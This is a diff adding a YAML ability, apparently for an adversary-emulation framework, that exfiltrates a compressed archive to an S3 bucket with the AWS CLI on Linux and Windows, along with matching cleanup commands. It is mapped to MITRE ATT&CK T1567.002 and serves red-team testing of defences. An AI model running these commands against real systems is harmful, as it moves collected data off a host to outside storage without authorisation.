@@ -1,0 +1,33 @@
+- id: e7bf5dc7-62e4-48b2-acf8-abaf8734c19c
+  name: Exfil Compressed Archive to S3 via AWS CLI
+  description: |
+    Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user
+    credentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration to Cloud Storage'
+  platforms:
+    linux:
+      sh:
+        command: |
+          LocalFile='#{host.dir.compress}';
+          RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+          aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;
+        cleanup: |
+          LocalFile='#{host.dir.compress}';
+          RemoteName="exfil-#{paw}-$(basename $LocalFile)";
+          aws s3 rm s3://#{s3.source.name}/$RemoteName;
+    windows:
+      psh:
+        command: |
+          $SourceFile = (Get-Item #{host.dir.compress});
+          $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+          aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;
+        cleanup: |
+          $SourceFile = (Get-Item #{host.dir.compress});
+          $RemoteName = "exfil-#{paw}-$($SourceFile.name)";
+          aws s3 rm s3://#{s3.source.name}/$RemoteName;
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.dir.compress
